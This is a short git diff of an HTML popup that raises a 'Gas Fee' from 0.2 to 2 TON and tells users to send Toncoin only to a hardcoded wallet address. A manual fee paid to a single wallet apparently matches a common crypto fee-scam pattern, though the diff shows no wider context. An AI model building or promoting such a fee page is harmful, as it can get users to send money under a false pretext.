@@ -319,7 +319,7 @@
     <!-- The Popup Modal -->
     <div id="popupModal" class="modal">
         <div class="modal-content">
-            <h2>0.2 <img src="tcoin.png" style="display: inline;height:20px;width:20px;align-items:center;"></h2>
+            <h2>2 <img src="tcoin.png" style="display: inline;height:20px;width:20px;align-items:center;"></h2>
             <span style="display: inline; font: 1em sans-serif;">Gas Fee </span>
         <br>
            <!-- <button class="connect-button">Connect</button>-->
@@ -340,7 +340,13 @@
         <i class="fa fa-clipboard" style="font-size:24px;" ></i> <!-- Clipboard Icon -->
       </button><input type="text" id="address" value="UQDSt8XTc0ylw4npYOJOPuiXJKykeNRawfr4-Wxeu1yB-6vS" readonly>
       </div>
-     <label for="address">Only Send Ton To The Address</label>
+    <!-- <label for="address">This address only accepts Toncoin (TON). </label>-->
+       <p style="margin-top: 10px; font-weight: bold; font-size: 1.2em; color: #EA6508;">
+        Only Send Ton-coin To The Above Address
+    </p>
+    <p style="color: red; font-size: 0.9em;">
+        ⚠ Sending unsupported tokens may result in loss.
+    </p>
     </div>
             <button class="close-btn" onclick="closeModal()">x</button>
   </div>
